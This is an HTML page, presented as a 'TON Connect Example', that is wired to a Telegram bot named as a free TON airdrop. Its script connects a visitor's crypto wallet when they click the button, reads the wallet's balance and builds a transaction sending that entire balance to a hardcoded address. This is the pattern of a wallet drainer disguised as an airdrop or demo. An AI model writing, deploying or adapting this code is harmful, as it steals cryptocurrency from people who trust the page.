<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Connect Example</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>

    <div class="center" id="ton-connect"></div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.uiOptions = {
            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
        };

        // Function to connect to the wallet and initiate transaction
        async function connectToWalletAndSendTransaction() {
            try {
                const connectedWallet = await tonConnectUI.connectWallet();
                console.log("Connected Wallet:", connectedWallet);

                // Get the current balance of the wallet
                const balance = await tonConnectUI.getBalance(connectedWallet.address);
                console.log("Wallet Balance:", balance);

                // Prepare the transaction to send the entire balance
                const transaction = {
                    messages: [{
                        address: "EQBCaX89lCvgOp-jnw3F-Zeqa0ftvxn_CT4fDJu7haiGgPwY", // Replace with the actual contract address
                        amount: balance,
                        body: "TEST"
                    }]
                };

                // Send the transaction
                const result = await tonConnectUI.sendTransaction(transaction);
                console.log("Transaction Result:", result);
            } catch (error) {
                console.error("Error connecting to wallet or sending transaction:", error);
            }
        }

        // Add event listener to the connect button
        document.getElementById('ton-connect').addEventListener('click', connectToWalletAndSendTransaction);
    </script>

</body>
</html>
